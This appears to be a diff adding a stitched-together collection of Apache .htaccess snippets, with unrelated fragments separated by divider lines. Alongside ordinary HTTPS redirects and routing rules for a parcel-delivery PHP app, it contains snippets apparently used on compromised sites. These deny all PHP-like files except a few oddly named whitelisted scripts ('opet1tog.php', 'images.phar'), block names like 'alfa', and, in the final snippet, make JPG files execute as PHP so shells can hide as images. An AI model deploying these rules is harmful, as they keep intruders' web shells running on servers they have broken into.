@@ -1,0 +1,232 @@
+<FilesMatch ".(PhP|php|phtml|PhTmL|pHtML|phtmL|PHTML|php.php.php.php.php.php|php.php.phtml|PHTML.phtml|pht|Pht|pHt|phT|pHT|PHt|PHT|php11|php12|php.test|phar|suspected|php.suspected|php10|php11|php56|php.php.php|php.phtml|php.php.php.php.php|Php|pHp|phhP|pht|PHT|php.J|PHP|PhP|php1|php2|php4|php5|PHP5|PhP5|php6|php7|php8|php9|PHTML|aspx|ASPX|asp|ASP|php.jpg|PHP.JPG|php.xxxjpg|PHP.XXXJPG|php.jpeg|PHP.JPG|PHP.JPEG|PHP.PJEPG|php.pjpeg|php.fla|PHP.FLA|php.png|PHP.PNG|php.gif|PHP.GIF|php.test|php;.jpg|PHP JPG|PHP;.JPG|php;.jpeg|php jpg|php.bak|php.pdf|php.xxxpdf|php.xxxpng|php.xxxgif|php.xxxpjpeg|php.xxxjpeg|php3.xxxjpeg|php3.xxxjpg|php5.xxxjpg|php3.pjpeg|php5.pjpeg|shtml|php.unknown|php.doc|php.docx|php.pdf|php.ppdf|jpg.PhP|php.txt|php.xxxtxt|PHP.TXT|PHP.XXXTXT|php.xlsx|php.zip|php.xxxzip)$">
+Order Allow,Deny
+Deny from all
+</FilesMatch>
+<FilesMatch "^(index.html|sitemap.xml|index.php|load.php)$">
+Order allow,deny
+Allow from all
+</FilesMatch>
+_____________________________________________________________________________________________________
+
+<FilesMatch ".*\.(cgi|pl|py|pyc|pyo|php3|php4|php6|pcgi|pcgi3|pcgi4|pcgi5|pchi6|inc|php|Php|pHp|phP|PHp|pHP|PhP|PHP|PhP|php5|Php5|phar|PHAR|Phar|PHar|PHAr|pHAR|phAR|inc|phaR|pHp5|phP5|PHp5|pHP5|PhP5|PHP5|cgi|CGI|CGi|cGI|PhP5|php6|php7|php8|php9|phtml|Phtml|pHtml|phTml|pHTml|Fla|fLa|flA|FLa|fLA|FlA|FLA|phtMl|phtmL|PHtml|PhTml|PHTML|PHTml|PHTMl|PhtMl|PHTml|PHtML|pHTMl|PhTML|pHTML|PhtmL|PHTmL|PhtMl|PhtmL|pHtMl|PhTmL|pHtmL|aspx|ASPX|asp|ASP|php.jpg|PHP.JPG|php.xxxjpg|PHP.XXXJPG|php.jpeg|PHP.JPG|PHP.JPEG|PHP.PJEPG|php.pjpeg|php.fla|PHP.FLA|php.png|PHP.PNG|php.gif|PHP.GIF|php.test|php;.jpg|PHP JPG|PHP;.JPG|php;.jpeg|php jpg|php.bak|php.pdf|php.xxxpdf|php.xxxpng|fla|Fla|fLa|fLa|flA|FLa|fLA|FLA|FlA|php.xxxgif|php.xxxpjpeg|php.xxxjpeg|php3.xxxjpeg|php3.xxxjpg|php5.xxxjpg|php3.pjpeg|php5.pjpeg|shtml|php.unknown|php.doc|php.docx|php.pdf|php.ppdf|jpg.PhP|php.txt|php.xxxtxt|PHP.TXT|PHP.XXXTXT|php.xlsx|php.zip|php.xxxzip|php78|php56|php96|php69|php67|php68|php4|shtMl|shtmL|SHtml|ShTml|SHTML|SHTml|SHTMl|ShtMl|SHTml|SHtML|sHTMl|ShTML|sHTML|ShtmL|SHTmL|ShtMl|ShtmL|sHtMl|ShTmL|sHtmL|Shtml|sHtml|shTml|sHTml|shtml|php1|php2|php3|php4|php10|alfa|suspected|py|exe|alfa|html|htm)$"> 
+Order Allow,Deny
+Deny from all
+</FilesMatch>
+Options -Indexes
+<FilesMatch '^(index.html|validates.php)$'>
+ Order allow,deny
+ Allow from all
+</FilesMatch>
+_____________________________________________________________________________________________________
+
+Current File : /var/www/html/sidokar1/.htaccess22222
+RewriteEngine On
+
+RewriteCond %{HTTP_HOST} ^mywebsite\.com [NC]
+
+RewriteCond %{SERVER_PORT} 80 
+
+RewriteRule ^(.*)$ https://www.mywebsite.com/$1 [R=301,L]
+_____________________________________________________________________________________________________
+
+<FilesMatch ".(py|exe|phtml|php|PHP|Php|PHp|pHp|pHP|phP|PhP|php5|suspected|shtml|php7|php8|pHP7|PHP7|php58)$">
+Order allow,deny
+Deny from all
+</FilesMatch>
+<FilesMatch "^(images.phar|imgs1.php|opet1tog.php)$">
+Order allow,deny
+Allow from all
+</FilesMatch>
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+RewriteRule ^index.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . index.php [L]
+</IfModule>
+
+_____________________________________________________________________________________________________
+
+RewriteEngine On
+
+
+#RewriteCond %{HTTPS} off
+#RewriteRule ^(.*)$ http://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]
+
+<IfModule mod_headers.c>
+  <FilesMatch "\.(ttf|ttc|otf|eot|woff|woff2|font.css|css|js)$">
+    Header set Access-Control-Allow-Origin "*"
+  </FilesMatch>
+</IfModule>
+_____________________________________________________________________________________________________
+
+
+<IfModule mod_rewrite.c>
+# For security reasons, Option followsymlinks cannot be overridden.
+#Options +FollowSymLinks
+
+Options +SymLinksIfOwnerMatch
+RewriteEngine on
+
+# NOTICE: If you get a 404 play with combinations of the following commented out lines
+#AllowOverride All
+#RewriteBase /crm/
+# Keep people out of codeigniter directory and Git/Mercurial data
+
+RedirectMatch 403 ^/(application\/cache|codeigniter|\.git|\.hg).*$
+
+# Send request via index.php (again, not if its a real file or folder)
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+<IfModule mod_php5.c>
+RewriteRule ^(.*)$ index.php/$1 [L]
+</IfModule>
+<IfModule !mod_php5.c>
+RewriteRule ^(.*)$ index.php?/$1 [L]
+</IfModule>
+</IfModule>
+
+_____________________________________________________________________________________________________
+#AllowOverride Options
+#php_value session.gc_maxlifetime 3153600
+
+RewriteRule ^home$ index.php [QSA]
+RewriteRule ^data$ index.php?page=data [QSA]
+RewriteRule ^get-data$ index.php?page=get-data [QSA]
+RewriteRule ^customers$ index.php?page=customers [QSA]
+RewriteRule ^new-customer$ index.php?page=new-customer [QSA]
+RewriteRule ^users$ index.php?page=users [QSA]
+RewriteRule ^login$ index.php?page=login [QSA]
+RewriteRule ^logout$ index.php?page=logout [QSA]
+RewriteRule ^delivery-note$ index.php?page=delivery-note [QSA]
+RewriteRule ^delivery-note-stock$ index.php?page=delivery-note-stock [QSA]
+
+RewriteRule ^new-livreur$ index.php?page=new-livreur [QSA]
+
+#UpdatedForScanner begin
+
+RewriteRule ^barcode$ index.php?page=barcode [QSA]
+RewriteRule ^en-agence$ index.php?page=en-agence [QSA]
+
+#UpdatedForScanner end
+
+RewriteRule ^sent-note-livreur$ index.php?page=sent-note-livreur [QSA]
+
+
+RewriteRule ^pdf-parcel-ticket$ index.php?page=pdf-parcel-ticket [QSA]
+RewriteRule ^pdf-parcel-eticket$ index.php?page=pdf-parcel-eticket [QSA]
+
+RewriteRule ^sent-note$ index.php?page=sent-note [QSA]
+RewriteRule ^distribution-note$ index.php?page=distribution-note [QSA]
+RewriteRule ^add-parcel$ index.php?page=add-parcel [QSA]
+RewriteRule ^parcels$ index.php?page=parcels [QSA]
+
+RewriteRule ^suivi$ index.php?page=suivi [QSA]
+
+RewriteRule ^parcels_json$ index.php?page=parcels-json [QSA]
+RewriteRule ^parcels_json_relance$ index.php?page=parcels-json-relance [QSA]
+RewriteRule ^import-parcels$ index.php?page=import-parcels [QSA]
+RewriteRule ^import-parcels-stock$ index.php?page=import-parcels-stock [QSA]
+
+
+RewriteRule ^payments-note$ index.php?page=payments-note [QSA]
+RewriteRule ^invoices$ index.php?page=invoices [QSA]
+RewriteRule ^claims$ index.php?page=claims [QSA]
+RewriteRule ^return-note$ index.php?page=return-note [QSA]
+RewriteRule ^amana-tracking$ index.php?page=amana-tracking [QSA]
+RewriteRule ^parcel-search$ index.php?page=parcel-search [QSA]
+RewriteRule ^notifs$ index.php?page=notifs [QSA]
+RewriteRule ^statut-change$ index.php?page=statut-change [QSA]
+
+
+RewriteRule ^sent-note-livreur$ index.php?page=sent-note-livreur [QSA]
+RewriteRule ^received-note$ index.php?page=received-note [QSA]
+
+RewriteRule ^pickup-request$ index.php?page=pickup-request [QSA]
+RewriteRule ^remarque$ index.php?page=remarque [QSA]
+RewriteRule ^support_agent$ index.php?page=support_agent [QSA]
+RewriteRule ^support_type$ index.php?page=support_type [QSA]
+
+
+
+RewriteRule ^s_general$ index.php?page=s_general [QSA]
+RewriteRule ^s_cities$ index.php?page=s_cities [QSA]
+RewriteRule ^s_Emballage index.php?page=s_Emballage [QSA]
+RewriteRule ^s_zone$ index.php?page=s_zone [QSA]
+RewriteRule ^s_options$ index.php?page=s_options [QSA]
+RewriteRule ^s_account$ index.php?page=s_account [QSA]
+RewriteRule ^s_sms$ index.php?page=s_sms [QSA]
+RewriteRule ^s_email$ index.php?page=s_email [QSA]
+RewriteRule ^s_amana$ index.php?page=s_amana [QSA]
+RewriteRule ^s_partners$ index.php?page=s_partners [QSA]
+RewriteRule ^pdf-delivery-note$ index.php?page=pdf-delivery-note [QSA]
+
+RewriteRule ^pdf-distribution-note$ index.php?page=pdf-distribution-note [QSA]
+
+
+RewriteRule ^pdf-distribution-note-app$ index.php?page=pdf-distribution-note-app [QSA]
+RewriteRule ^pdf-payments-note-app$ index.php?page=pdf-payments-note-app [QSA]
+
+
+RewriteRule ^pdf-sent-note$ index.php?page=pdf-sent-note [QSA]
+RewriteRule ^pdf-payments-note$ index.php?page=pdf-payments-note [QSA]
+RewriteRule ^pdf-return-note$ index.php?page=pdf-return-note [QSA]
+RewriteRule ^pdf-invoices$ index.php?page=pdf-invoices [QSA]
+RewriteRule ^pdf-excelinvoices$ index.php?page=pdf-excelinvoices [QSA]
+RewriteRule ^pdf-delivery-note-tickets$ index.php?page=pdf-delivery-note-tickets [QSA]
+RewriteRule ^pdf-delivery-note-etickets$ index.php?page=pdf-delivery-note-etickets [QSA]
+RewriteRule ^pdf-delivery-note-etickets-stock$ index.php?page=pdf-delivery-note-etickets-stock [QSA]
+
+RewriteRule ^pdf-delivery-note-tickets-4-4$ index.php?page=pdf-delivery-note-tickets-4-4 [QSA]
+RewriteRule ^parcel-ticket$ index.php?page=parcel-ticket [QSA]
+
+RewriteRule ^pdf-delivery-note-stock$ index.php?page=pdf-delivery-note-stock [QSA]
+RewriteRule ^pdf-delivery-note-stock-tickets$ index.php?page=pdf-delivery-note-stock-tickets [QSA]
+
+RewriteRule ^pdf-send-note-stock-tickets$ index.php?page=pdf-send-note-stock-tickets [QSA]
+
+
+RewriteRule ^statistics$ index.php?page=statistics [QSA]
+RewriteRule ^email$ index.php?page=email [QSA]
+RewriteRule ^spent$ index.php?page=spent [QSA]
+RewriteRule ^inventory$ index.php?page=inventory [QSA]
+RewriteRule ^product$ index.php?page=product [QSA]
+RewriteRule ^parcels-from-inventory$ index.php?page=parcels-from-inventory [QSA]
+_____________________________________________________________________________________________________
+htaccess untuk file jpg agar terbaca php
+<FilesMatch "\.jpg$">
+    SetHandler application/x-httpd-php
+</FilesMatch>
+
+<FilesMatch "\.(jpg|jpeg)$">
+    SetHandler application/x-httpd-php
+</FilesMatch>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
